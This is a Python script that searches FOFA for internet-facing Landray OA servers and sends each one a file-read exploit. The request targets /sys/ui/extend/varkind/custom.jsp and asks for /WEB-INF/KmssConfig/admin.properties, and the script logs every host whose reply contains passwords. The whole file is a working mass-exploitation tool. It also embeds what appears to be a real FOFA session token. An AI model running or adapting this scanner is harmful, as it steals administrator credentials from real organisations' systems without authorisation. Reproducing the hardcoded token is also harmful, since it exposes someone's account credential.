import requests
import base64
import sys
import time
from lxml import etree
import threading
import queue
import urllib.request
from requests.adapters import HTTPAdapter
fofa='app="Landray-OA系统"'
fofa=fofa.encode("utf-8")
fofa_base=base64.b64encode(fofa)
fofa_basede=fofa_base.decode("utf-8")
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "cookie":"fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTAwOTE4LCJtaWQiOjEwMDA2MTU1MiwidXNlcm5hbWUiOiJMZTFhIiwiZXhwIjoxNjMzOTYxNzYyfQ.rJMOgfeLL_tUGbHJAdxrn05lz1YWAOwCbWnuAWdznjl1UEFsH2pOWkFLx9yOUsbJ1fnbC8_hAeUL1y8C_GmdvA"

}
def banber():
    logo='''
---------------------------------------------------------------------------
  __        __       _ _       _                                     
 / _| ___  / _| __ _| (_)_ __ | | ____ _  __ _  ___ _ __   ___   ___ 
| |_ / _ \| |_ / _` | | | '_ \| |/ / _` |/ _` |/ _ \ '_ \ / _ \ / __|
|  _| (_) |  _| (_| | | | | | |   < (_| | (_| |  __/ |_) | (_) | (__ 
|_|  \___/|_|  \__,_|_|_|_| |_|_|\_\__,_|\__, |\___| .__/ \___/ \___|
                                         |___/     |_|   
===========================================================================                                     
                                         '''
    return logo

help='''
example:   python3 fofa.py rannge[1--9999]
    '''


def fofa_check(pages):
    logo = banber()
    print(logo)
    print(help)
    for page in range(1, pages+1):
        try:
            url = 'https://fofa.so/result?page=' + str(page) + '&qbase64=' + fofa_basede
            r = requests.get(url=url, headers=headers)
            r1 = r.content
            soup = etree.HTML(r1.decode('utf-8'))
            result = soup.xpath('//span[@class="aSpan"]/a[@target="_blank"]/@href')
            results = '\n'.join(result)
            results = results.split()
            for urls in results:
                try:
                    poc(urls)
                    sleep(1)
                except Exception as w:
                    pass
                time.sleep(1)
        except Exception as e:
            time.sleep(1)
            pass


def poc(url):
    headerss = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    payload='/sys/ui/extend/varkind/custom.jsp'
    data='var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    urls=url+payload
    resaule= requests.Session()
    resaule.mount('http://', HTTPAdapter(max_retries=0))
    resaule.mount('https://', HTTPAdapter(max_retries=0))
    try:
        resaule=requests.post(url=urls,data=data,headers=headerss,timeout=4)
        resaules=resaule.status_code
        resaules_re=resaule.content
        resaules_re=resaules_re.decode("utf-8")
        if resaules==404:
            print('url---->:'+url+'---------不存在漏洞')
        else:
            if 'password' in resaule.content.decode("utf-8") and resaules == 200:
                print('url--->:' + url + '存在漏洞')
                with open(r'poc.txt','a+',encoding='utf-8') as f:
                    f.write('url------>:'+url+'---------存在漏洞！'+'\n')
                    f.close()
            else:
                print('url--->:' + url + '---------不存在漏洞')
    except requests.exceptions.RequestException as e:
        print('url------>:'+url+'---------请求超时！')


if __name__=='__main__':
    pages=sys.argv[1]
    fofa_check(int(pages))